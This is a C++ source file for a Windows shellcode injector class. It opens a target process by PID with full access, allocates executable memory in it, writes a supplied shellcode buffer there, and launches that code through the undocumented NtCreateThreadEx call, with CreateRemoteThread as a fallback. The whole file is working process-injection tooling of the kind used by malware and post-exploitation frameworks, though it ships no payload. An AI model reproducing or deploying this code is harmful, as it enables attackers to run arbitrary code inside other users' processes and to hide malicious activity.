#include "StdAfx.h"
#include "ShellcodeInjector.h"
#include <iostream>

ShellcodeInjector::ShellcodeInjector(void)
{
	bpShellcode = NULL;
}

bool ShellcodeInjector::setShellcode(BYTE* bShellcode, UINT length)
{
	unsigned int i = 0;
	bpShellcode = (BYTE*) malloc(sizeof(BYTE) * length + 1);
	if (bpShellcode == NULL) {
		return false;
	}

	shellcodeLength = length;
	memcpy(bpShellcode, bShellcode, length);

	return true;
}

HANDLE ShellcodeInjector::NtCreateThreadEx(HANDLE hProcess, LPVOID lpRemoteThreadStart, LPVOID lpRemoteCallback) 
{ 
	UNKNOWN Buffer; 
	DWORD dw0 = 0; 
	DWORD dw1 = 0; 
	HANDLE hRemoteThread = NULL; 
	HRESULT hRes = 0; 
	NtCreateThreadEx_PROC* __NtCreateThreadEx = NULL;

	memset(&Buffer, 0, sizeof(UNKNOWN)); 

	Buffer.Length = sizeof (UNKNOWN); 
	Buffer.Unknown1 = 0x10003; 
	Buffer.Unknown2 = 0x8; 
	Buffer.Unknown3 = &dw1; 
	Buffer.Unknown4 = 0; 
	Buffer.Unknown5 = 0x10004; 
	Buffer.Unknown6 = 4; 
	Buffer.Unknown7 = &dw0; 

	__NtCreateThreadEx = 
		(NtCreateThreadEx_PROC*) GetProcAddress(
			GetModuleHandle(L"ntdll.dll"), 
			"NtCreateThreadEx"
		); 

	if(__NtCreateThreadEx == NULL) 
		return NULL; 

	if(!SUCCEEDED(hRes = __NtCreateThreadEx( 
		&hRemoteThread, 
		0x1FFFFF, 
		NULL, 
		hProcess, 
		(LPTHREAD_START_ROUTINE)lpRemoteThreadStart, 
		lpRemoteCallback, 
		FALSE, 
		NULL, 
		NULL, 
		NULL, 
		&Buffer 
		))) 
	{ 
		return NULL; 
	} 

	return hRemoteThread; 
} 

HANDLE ShellcodeInjector::__CreateRemoteThread(HANDLE hProcess, LPVOID lpRemoteThreadStart, LPVOID lpRemoteCallback) 
{ 
	if(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx")) 
	{ 
		return NtCreateThreadEx(
			hProcess, 
			lpRemoteThreadStart, 
			lpRemoteCallback
		); 
	} 
	else 
	{ 
		return CreateRemoteThread(
			hProcess, 
			NULL, 
			0, 
			(LPTHREAD_START_ROUTINE)lpRemoteThreadStart, 
			lpRemoteCallback, 
			0, 
			0
		); 
	} 

	return NULL; 
}



bool ShellcodeInjector::Inject(int pid)
{
	HANDLE hHandle = NULL;
	LPVOID lpShellcode = NULL;
	HANDLE hThread = NULL;

	hHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	if (hHandle == INVALID_HANDLE_VALUE || hHandle == NULL) {
		throw std::logic_error("[~]Error: OpenProcess");
		return false;
	}

	lpShellcode = VirtualAllocEx( 
		hHandle, 
		0, 
		shellcodeLength, 
		MEM_COMMIT, PAGE_EXECUTE_READWRITE 
	);

	if (lpShellcode == NULL) {
		throw std::logic_error("[~]Error: VirtualAllocEx");
		return false;
	}

	if (WriteProcessMemory(hHandle, lpShellcode, bpShellcode, shellcodeLength, 0) == 0) {
		throw std::logic_error("[~]Error: WriteProcessMemory");
		return false;
	}

	hThread = __CreateRemoteThread( hHandle, lpShellcode, 0 );
	if( hThread == NULL ) {
		CloseHandle( hHandle );
		throw std::logic_error("[~]Error: __CreateRemoteThread");
		return false;
	}

	return true;
}

ShellcodeInjector::~ShellcodeInjector(void)
{
	free(bpShellcode);
	bpShellcode = NULL;
}
